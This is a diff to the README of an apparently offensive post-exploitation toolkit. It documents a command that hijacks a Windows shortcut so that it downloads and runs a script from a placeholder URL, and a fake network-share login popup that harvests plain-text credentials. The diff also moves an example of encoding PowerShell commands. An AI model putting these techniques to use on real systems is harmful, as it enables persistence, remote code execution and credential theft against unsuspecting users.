@@ -71,13 +71,19 @@ creates a dialog box prompting the user for credentials.
 Generates a PowerShell formatted encoded command. Insure to quote your command
 string.
 
+```
+gen-enccmd "cmd /c ipconfig /all"
+```
+
 * shortcut-inject "name-of-lnk" "Url-hosting-script"
 Modifies the specified shortcut to run the original program and also execute a download
 and execute command string. Ex: "Google Chrome.lnk" "http://some-doman[.]com/hello.ps1" 
 Requires the http:// or https:// in the URL.
-```
-gen-enccmd "cmd /c ipconfig /all"
-```
+
+* askfor-creds
+Performs some social engineering inorder to aquire plain-text credentials. This is done
+by generating a authentication popup which seems to reconnect to a network share.
+
 ### caveats
 Depending on your command structure and use of special characters you may need
 to encapsulate your command string in a variable before passing to this function.
